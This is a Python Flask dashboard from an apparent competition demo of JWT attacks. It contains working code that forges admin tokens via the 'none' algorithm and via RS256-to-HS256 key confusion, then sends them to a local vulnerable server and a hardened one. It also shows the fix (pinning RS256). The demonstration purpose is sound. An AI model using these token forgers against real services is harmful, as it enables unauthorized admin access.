"""
dashboard.py — Web UI for the JWT attack demo (port 5002)
==========================================================
Serves a browser dashboard that lets you trigger attacks with a button click
and see live color-coded results (SUCCESS / BLOCKED) against both servers.

Why this exists:
  The judges rubric (Communication & Demo, 4 marks) requires demo clarity
  visible from the back of the room. A web panel with large colored labels
  is clearer than terminal output for a live audience.

Usage:
  # In terminal 1:  python vulnerable_app.py
  # In terminal 2:  python hardened_app.py
  # In terminal 3:  python dashboard.py
  # Open browser:   http://localhost:5002

MITRE ATT&CK: T1550.001 — Use Alternate Authentication Material
"""

import base64
import hashlib
import hmac
import json
import time

import requests
from flask import Flask, jsonify, render_template_string

app = Flask(__name__)

import os
# If SERVER_IP env var is set, dashboard talks to that machine.
# Otherwise falls back to localhost (run on same machine as servers).
# Usage from attacker laptop: set SERVER_IP=10.236.147.152 before running.
_server_ip = os.environ.get("SERVER_IP", "localhost")
VULN_URL = f"http://{_server_ip}:5000"
HARD_URL  = f"http://{_server_ip}:5001"

# ── Token builders (same logic as attack scripts) ──────────────────────────

def _b64url_encode(data: dict) -> str:
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )


def build_none_token() -> str:
    """Attack 1: alg=none, empty signature — no crypto needed."""
    h = _b64url_encode({"alg": "none", "typ": "JWT"})
    p = _b64url_encode({"user": "attacker", "role": "admin"})
    return f"{h}.{p}."


def build_confusion_token(public_key_pem: str) -> str:
    """Attack 2: HS256 signed with server's public key as HMAC secret."""
    h = _b64url_encode({"alg": "HS256", "typ": "JWT"})
    p = _b64url_encode({"user": "attacker", "role": "admin"})
    signing_input = f"{h}.{p}".encode("utf-8")
    sig = hmac.new(public_key_pem.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{sig_b64}"


def _probe(base_url: str, token: str) -> dict:
    """Send forged token to /admin, return status + body."""
    try:
        r = requests.get(
            f"{base_url}/admin",
            headers={"Authorization": f"Bearer {token}"},
            timeout=4,
        )
        return {"status": r.status_code, "body": r.json()}
    except requests.exceptions.ConnectionError:
        return {"status": None, "body": {"error": "server not reachable"}}


def _server_ok(url: str) -> bool:
    try:
        requests.get(f"{url}/public-key", timeout=2)
        return True
    except Exception:
        return False


# ── API endpoints (called by the browser via fetch) ────────────────────────

@app.route("/api/status")
def api_status():
    """Ping both servers and return their up/down state."""
    return jsonify({
        "vulnerable": _server_ok(VULN_URL),
        "hardened":   _server_ok(HARD_URL),
    })


@app.route("/api/attack1")
def api_attack1():
    """Run Attack 1 (none alg) against both servers and return results."""
    token = build_none_token()
    vuln  = _probe(VULN_URL, token)
    hard  = _probe(HARD_URL, token)
    return jsonify({
        "attack":      "Attack 1 — 'none' Algorithm Bypass",
        "mitre":       "T1550.001",
        "cve":         "CVE-2015-9235",
        "how":         "Set alg=none in JWT header, leave signature empty. Server skips verification.",
        "needs":       "Nothing — zero cryptographic material required.",
        "token":       token,
        "vulnerable":  vuln,
        "hardened":    hard,
        "timestamp":   time.strftime("%H:%M:%S"),
    })


@app.route("/api/attack2")
def api_attack2():
    """Run Attack 2 (RS256→HS256 confusion) against both servers."""
    try:
        pub_key = requests.get(f"{VULN_URL}/public-key", timeout=4).text
    except Exception:
        return jsonify({"error": "Cannot reach vulnerable server to fetch public key"}), 503

    token = build_confusion_token(pub_key)
    vuln  = _probe(VULN_URL, token)
    hard  = _probe(HARD_URL, token)
    return jsonify({
        "attack":      "Attack 2 — RS256→HS256 Algorithm Confusion",
        "mitre":       "T1550.001",
        "cve":         "CVE-2015-9235 / Auth0 2022",
        "how":         "Sign with HS256 using server's PUBLIC key as HMAC secret. Server verifies with same key — accepts it.",
        "needs":       "Only the public key from /public-key (no private key required).",
        "pub_key_len": len(pub_key),
        "token":       token,
        "vulnerable":  vuln,
        "hardened":    hard,
        "timestamp":   time.strftime("%H:%M:%S"),
    })


@app.route("/api/login")
def api_login():
    """Get a legitimate alice token for comparison."""
    try:
        r = requests.post(
            f"{VULN_URL}/login",
            json={"username": "alice", "password": "pass123"},
            timeout=4,
        )
        return jsonify(r.json())
    except Exception as e:
        return jsonify({"error": str(e)}), 503


# ── Dashboard HTML ─────────────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JWT Attack Demo — Problem #17</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: #0d1117;
    color: #e6edf3;
    min-height: 100vh;
    padding: 24px;
  }

  .header {
    text-align: center;
    margin-bottom: 32px;
  }
  .header h1 {
    font-size: 2rem;
    font-weight: 700;
    color: #58a6ff;
    letter-spacing: 1px;
  }
  .header .sub {
    font-size: 0.9rem;
    color: #8b949e;
    margin-top: 6px;
  }
  .mitre-badge {
    display: inline-block;
    background: #1f2937;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 4px 12px;
    font-size: 0.8rem;
    color: #f78166;
    margin-top: 8px;
    font-family: monospace;
  }

  .grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;
    max-width: 1200px;
    margin: 0 auto;
  }

  .card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 12px;
    padding: 20px;
  }
  .card h2 {
    font-size: 1rem;
    font-weight: 600;
    margin-bottom: 14px;
    color: #c9d1d9;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  /* Server status */
  .servers {
    grid-column: 1 / -1;
    display: flex;
    gap: 16px;
  }
  .server-pill {
    flex: 1;
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 8px;
    padding: 14px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .server-pill .name { font-weight: 600; font-size: 1rem; }
  .server-pill .port { font-family: monospace; color: #8b949e; font-size: 0.85rem; }
  .dot {
    width: 12px; height: 12px;
    border-radius: 50%;
    background: #30363d;
    transition: background 0.4s;
  }
  .dot.up   { background: #2ea043; box-shadow: 0 0 8px #2ea043; }
  .dot.down { background: #da3633; box-shadow: 0 0 8px #da3633; }

  /* Attack buttons */
  .btn {
    display: block;
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 8px;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: opacity 0.2s, transform 0.1s;
    margin-top: 12px;
    letter-spacing: 0.3px;
  }
  .btn:hover   { opacity: 0.85; }
  .btn:active  { transform: scale(0.98); }
  .btn-primary { background: #1f6feb; color: #fff; }
  .btn-danger  { background: #da3633; color: #fff; }
  .btn-info    { background: #388bfd22; color: #58a6ff; border: 1px solid #1f6feb; }
  .btn:disabled { opacity: 0.4; cursor: not-allowed; }

  /* Attack meta */
  .attack-meta {
    background: #0d1117;
    border-radius: 8px;
    padding: 12px 14px;
    font-size: 0.82rem;
    color: #8b949e;
    line-height: 1.6;
    margin-top: 12px;
  }
  .attack-meta .label { color: #c9d1d9; font-weight: 600; }
  .cve-tag {
    display: inline-block;
    background: #2d1b00;
    border: 1px solid #9e6a03;
    color: #d29922;
    border-radius: 4px;
    padding: 1px 7px;
    font-size: 0.75rem;
    font-family: monospace;
  }

  /* Result rows */
  .result-row {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-top: 10px;
    padding: 10px 14px;
    border-radius: 8px;
    background: #0d1117;
    font-size: 0.9rem;
  }
  .result-row .server-name { flex: 1; color: #8b949e; }
  .badge {
    padding: 3px 12px;
    border-radius: 20px;
    font-weight: 700;
    font-size: 0.8rem;
    font-family: monospace;
    min-width: 90px;
    text-align: center;
  }
  .badge.success { background: #0f2c18; color: #2ea043; border: 1px solid #2ea04340; }
  .badge.blocked { background: #2c0f0f; color: #f85149; border: 1px solid #f8514940; }
  .badge.pending { background: #21262d; color: #8b949e; }
  .http-code { font-family: monospace; color: #c9d1d9; font-size: 0.85rem; }

  /* Token display */
  .token-box {
    margin-top: 10px;
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 10px;
    font-family: monospace;
    font-size: 0.72rem;
    color: #79c0ff;
    word-break: break-all;
    max-height: 80px;
    overflow-y: auto;
  }

  /* Log panel */
  .log-panel {
    grid-column: 1 / -1;
  }
  #log {
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 8px;
    padding: 14px;
    font-family: monospace;
    font-size: 0.82rem;
    color: #e6edf3;
    height: 220px;
    overflow-y: auto;
    line-height: 1.7;
  }
  .log-success { color: #2ea043; }
  .log-blocked { color: #f85149; }
  .log-info    { color: #58a6ff; }
  .log-dim     { color: #8b949e; }

  /* Theory panel */
  .theory {
    grid-column: 1 / -1;
  }
  .theory-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 0.85rem;
  }
  .theory-table th {
    text-align: left;
    padding: 8px 12px;
    color: #8b949e;
    border-bottom: 1px solid #30363d;
    font-weight: 600;
    text-transform: uppercase;
    font-size: 0.75rem;
    letter-spacing: 0.5px;
  }
  .theory-table td {
    padding: 9px 12px;
    border-bottom: 1px solid #21262d;
    color: #c9d1d9;
    vertical-align: top;
  }
  .theory-table tr:last-child td { border-bottom: none; }
  .vuln-label  { color: #f85149; font-weight: 600; }
  .fix-label   { color: #2ea043; font-weight: 600; }

  @media (max-width: 700px) {
    .grid { grid-template-columns: 1fr; }
    .servers { flex-direction: column; }
  }
</style>
</head>
<body>

<div class="header">
  <h1>JWT Attack Demo</h1>
  <div class="sub">Problem #17 — JWT Authentication Bypass &amp; Algorithm Confusion</div>
  <div class="mitre-badge">MITRE ATT&amp;CK: T1550.001 — Use Alternate Authentication Material</div>
</div>

<div class="grid">

  <!-- Server status row -->
  <div class="servers card">
    <div class="server-pill">
      <div>
        <div class="name">Vulnerable Server</div>
        <div class="port">localhost:5000 &nbsp;|&nbsp; algorithms: RS256, HS256, none</div>
      </div>
      <div class="dot" id="dot-vuln"></div>
    </div>
    <div class="server-pill">
      <div>
        <div class="name">Hardened Server</div>
        <div class="port">localhost:5001 &nbsp;|&nbsp; algorithms: RS256 only</div>
      </div>
      <div class="dot" id="dot-hard"></div>
    </div>
  </div>

  <!-- Attack 1 card -->
  <div class="card">
    <h2>&#9889; Attack 1 — "none" Algorithm Bypass</h2>
    <div class="attack-meta">
      <div><span class="label">How: </span>Set <code>alg=none</code> in the JWT header, leave signature empty. Server skips verification.</div>
      <div style="margin-top:6px"><span class="label">Needs: </span>Nothing. Zero cryptographic material.</div>
      <div style="margin-top:6px"><span class="cve-tag">CVE-2015-9235</span></div>
    </div>

    <button class="btn btn-danger" id="btn1" onclick="runAttack(1)">
      &#9654; Run Attack 1 on Both Servers
    </button>
    <button class="btn btn-info" onclick="getToken()">Get Real Alice Token (for comparison)</button>

    <div class="result-row" id="a1-vuln-row" style="display:none">
      <span class="server-name">Vulnerable :5000</span>
      <span class="badge pending" id="a1-vuln-badge">—</span>
      <span class="http-code" id="a1-vuln-code"></span>
    </div>
    <div class="result-row" id="a1-hard-row" style="display:none">
      <span class="server-name">Hardened &nbsp;:5001</span>
      <span class="badge pending" id="a1-hard-badge">—</span>
      <span class="http-code" id="a1-hard-code"></span>
    </div>
    <div class="token-box" id="a1-token" style="display:none"></div>
  </div>

  <!-- Attack 2 card -->
  <div class="card">
    <h2>&#128273; Attack 2 — RS256 → HS256 Algorithm Confusion</h2>
    <div class="attack-meta">
      <div><span class="label">How: </span>Sign forged token with HS256 using the server's PUBLIC key as the HMAC secret. Server verifies with the same public key — accepts it.</div>
      <div style="margin-top:6px"><span class="label">Needs: </span>Only the public key from <code>/public-key</code> (no private key).</div>
      <div style="margin-top:6px"><span class="cve-tag">CVE-2015-9235</span> &nbsp; <span class="cve-tag">Auth0 2022</span></div>
    </div>

    <button class="btn btn-danger" id="btn2" onclick="runAttack(2)">
      &#9654; Run Attack 2 on Both Servers
    </button>
    <button class="btn btn-info" onclick="window.open('http://localhost:5000/public-key','_blank')">View Public Key at /public-key</button>

    <div class="result-row" id="a2-vuln-row" style="display:none">
      <span class="server-name">Vulnerable :5000</span>
      <span class="badge pending" id="a2-vuln-badge">—</span>
      <span class="http-code" id="a2-vuln-code"></span>
    </div>
    <div class="result-row" id="a2-hard-row" style="display:none">
      <span class="server-name">Hardened &nbsp;:5001</span>
      <span class="badge pending" id="a2-hard-badge">—</span>
      <span class="http-code" id="a2-hard-code"></span>
    </div>
    <div class="token-box" id="a2-token" style="display:none"></div>
  </div>

  <!-- Theory table -->
  <div class="theory card">
    <h2>&#128218; Attack Theory &amp; Fix (Section 4 &amp; 9 of Plan)</h2>
    <table class="theory-table">
      <thead>
        <tr>
          <th>#</th>
          <th>Vulnerability</th>
          <th>Root Cause</th>
          <th>Impact</th>
          <th>Fix</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>1</td>
          <td class="vuln-label">"none" algorithm</td>
          <td>Server includes <code>none</code> in accepted algorithm list — skips signature verification entirely</td>
          <td>Anyone can forge any token with any claims. No crypto needed.</td>
          <td class="fix-label"><code>algorithms=["RS256"]</code></td>
        </tr>
        <tr>
          <td>2</td>
          <td class="vuln-label">RS256 → HS256 confusion</td>
          <td>Server accepts HS256 and verifies with the public key as HMAC secret</td>
          <td>Attacker signs with HS256 using the public key — server verifies with same key and accepts it</td>
          <td class="fix-label"><code>algorithms=["RS256"]</code></td>
        </tr>
        <tr>
          <td>3</td>
          <td class="vuln-label">Claim forgery</td>
          <td>Consequence of Attack 1 or 2 — attacker controls the payload</td>
          <td>Inject <code>role: admin</code> into forged token and call protected endpoints</td>
          <td class="fix-label">Algorithm pinning prevents payload forgery</td>
        </tr>
      </tbody>
    </table>
  </div>

  <!-- Log panel -->
  <div class="log-panel card">
    <h2>&#128196; Live Event Log</h2>
    <div id="log"><span class="log-dim">Waiting for attacks... Click a button above to begin.</span></div>
  </div>

</div>

<script>
  function log(msg, cls) {
    const el = document.getElementById('log');
    const line = document.createElement('div');
    line.className = cls || '';
    line.textContent = '[' + new Date().toLocaleTimeString() + ']  ' + msg;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
  }

  function setBadge(id, status) {
    const el = document.getElementById(id);
    if (status === 200) {
      el.className = 'badge success';
      el.textContent = 'SUCCESS ✓';
    } else if (status === null) {
      el.className = 'badge blocked';
      el.textContent = 'UNREACHABLE';
    } else {
      el.className = 'badge blocked';
      el.textContent = 'BLOCKED ✗';
    }
  }

  async function runAttack(n) {
    const btn = document.getElementById('btn' + n);
    btn.disabled = true;
    btn.textContent = 'Running...';

    log('Launching Attack ' + n + ' against both servers...', 'log-info');

    try {
      const res = await fetch('/api/attack' + n);
      const d = await res.json();

      // Show token
      const tbox = document.getElementById('a' + n + '-token');
      tbox.style.display = 'block';
      tbox.textContent = d.token || 'N/A';

      // Vulnerable server result
      const vRow = document.getElementById('a' + n + '-vuln-row');
      vRow.style.display = 'flex';
      setBadge('a' + n + '-vuln-badge', d.vulnerable.status);
      document.getElementById('a' + n + '-vuln-code').textContent = 'HTTP ' + (d.vulnerable.status || '???');

      // Hardened server result
      const hRow = document.getElementById('a' + n + '-hard-row');
      hRow.style.display = 'flex';
      setBadge('a' + n + '-hard-badge', d.hardened.status);
      document.getElementById('a' + n + '-hard-code').textContent = 'HTTP ' + (d.hardened.status || '???');

      // Log
      if (d.vulnerable.status === 200) {
        log(d.attack + ' → VULNERABLE server: SUCCESS (HTTP 200) — forged admin token accepted!', 'log-success');
        const flag = d.vulnerable.body && d.vulnerable.body.flag;
        if (flag) log('  Flag captured: ' + flag, 'log-success');
      } else {
        log(d.attack + ' → VULNERABLE server: HTTP ' + d.vulnerable.status, 'log-blocked');
      }

      if (d.hardened.status !== 200) {
        log(d.attack + ' → HARDENED server: BLOCKED (HTTP ' + d.hardened.status + ') — algorithms=[RS256] worked!', 'log-blocked');
      } else {
        log(d.attack + ' → HARDENED server: HTTP ' + d.hardened.status + ' (unexpected — check config!)', 'log-blocked');
      }

      if (d.cve) log('  CVE reference: ' + d.cve, 'log-dim');
      log('  How: ' + d.how, 'log-dim');

    } catch(e) {
      log('Error running attack ' + n + ': ' + e.message, 'log-blocked');
    }

    btn.disabled = false;
    btn.textContent = '▶ Run Attack ' + n + ' on Both Servers';
  }

  async function getToken() {
    log('Fetching real alice token from /login...', 'log-info');
    try {
      const r = await fetch('/api/login');
      const d = await r.json();
      if (d.token) {
        log('  Real alice token: ' + d.token.substring(0,60) + '...', 'log-dim');
        log('  Compare: notice alg=RS256 in header vs alg=none in forged token', 'log-dim');
      } else {
        log('  Login failed: ' + JSON.stringify(d), 'log-blocked');
      }
    } catch(e) {
      log('Error: ' + e.message, 'log-blocked');
    }
  }

  // Poll server status every 3 seconds
  async function pollStatus() {
    try {
      const r = await fetch('/api/status');
      const d = await r.json();
      const vd = document.getElementById('dot-vuln');
      const hd = document.getElementById('dot-hard');
      vd.className = 'dot ' + (d.vulnerable ? 'up' : 'down');
      hd.className = 'dot ' + (d.hardened   ? 'up' : 'down');
    } catch(e) {}
  }

  pollStatus();
  setInterval(pollStatus, 3000);
</script>
</body>
</html>"""


@app.route("/")
def index():
    return render_template_string(DASHBOARD_HTML)


if __name__ == "__main__":
    print("=" * 65)
    print("  JWT ATTACK DASHBOARD — port 5002")
    print("  Open: http://localhost:5002")
    print("  Requires: vulnerable_app.py (5000) + hardened_app.py (5001)")
    print("=" * 65)
    app.run(host="0.0.0.0", port=5002, debug=False)
